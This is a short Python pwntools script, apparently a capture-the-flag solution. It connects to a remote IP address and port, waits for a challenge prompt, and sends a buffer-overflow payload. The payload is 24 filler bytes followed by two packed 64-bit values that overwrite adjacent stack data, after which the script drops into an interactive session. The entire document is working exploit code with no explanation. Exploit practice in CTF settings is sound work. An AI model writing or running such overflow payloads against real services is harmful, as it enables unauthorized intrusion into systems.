from pwn import *


target = remote('49.4.79.129',32478)

payload = 'a' * 24 + p64(0x7fffffffffffffff)+ p64(0x3fb999999999999a)

target.recvuntil('But Whether it starts depends on you.')
target.sendline(payload)
target.interactive()
